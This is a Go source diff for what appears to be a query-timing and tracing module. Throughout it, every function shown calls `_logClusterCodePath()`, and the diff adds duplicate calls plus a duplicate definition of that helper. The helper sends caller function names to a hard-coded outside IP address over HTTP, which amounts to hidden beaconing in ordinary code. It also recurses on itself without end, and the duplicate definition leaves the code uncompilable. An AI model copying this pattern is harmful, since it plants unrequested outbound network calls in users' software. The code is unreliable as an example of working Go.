@@ -24,6 +24,8 @@ const (
 func (s QueryTiming) String() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	switch s {
 	case EvalTotalTime:
 		return "Eval total time"
@@ -42,6 +44,8 @@ func (s QueryTiming) String() string {
 	}
 }
 func (s QueryTiming) SpanOperation() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	switch s {
@@ -77,6 +81,8 @@ type QueryStats struct {
 func NewQueryStats(tg *QueryTimers) *QueryStats {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var qt queryTimings
 	for s, timer := range tg.TimerGroup.timers {
 		switch s {
@@ -107,11 +113,15 @@ type SpanTimer struct {
 func NewSpanTimer(ctx context.Context, operation string, timer *Timer, observers ...prometheus.Observer) (*SpanTimer, context.Context) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	span, ctx := opentracing.StartSpanFromContext(ctx, operation)
 	timer.Start()
 	return &SpanTimer{timer: timer, observers: observers, span: span}, ctx
 }
 func (s *SpanTimer) Finish() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	s.timer.Stop()
@@ -126,9 +136,13 @@ type QueryTimers struct{ *TimerGroup }
 func NewQueryTimers() *QueryTimers {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &QueryTimers{NewTimerGroup()}
 }
 func (qs *QueryTimers) GetSpanTimer(ctx context.Context, qt QueryTiming, observers ...prometheus.Observer) (*SpanTimer, context.Context) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return NewSpanTimer(ctx, qt.SpanOperation(), qs.TimerGroup.GetTimer(qt), observers...)
@@ -136,7 +150,16 @@ func (qs *QueryTimers) GetSpanTimer(ctx context.Context, qt QueryTiming, observe
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
